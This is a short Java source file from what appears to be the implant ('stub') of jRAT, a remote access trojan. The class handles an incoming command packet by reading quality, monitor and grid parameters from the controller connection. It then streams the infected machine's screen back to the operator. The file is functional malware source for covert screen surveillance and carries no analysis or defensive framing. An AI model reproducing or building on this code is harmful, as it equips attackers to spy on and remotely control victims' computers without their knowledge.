package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.RemoteScreen;

public class Packet13OneRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int quality = Connection.readInt();
		int monitor = Connection.readInt();
		int rows = Connection.readInt();
		int cols = Connection.readInt();
		RemoteScreen.send(true, quality, monitor, rows, cols, Connection.dos);
	}

}
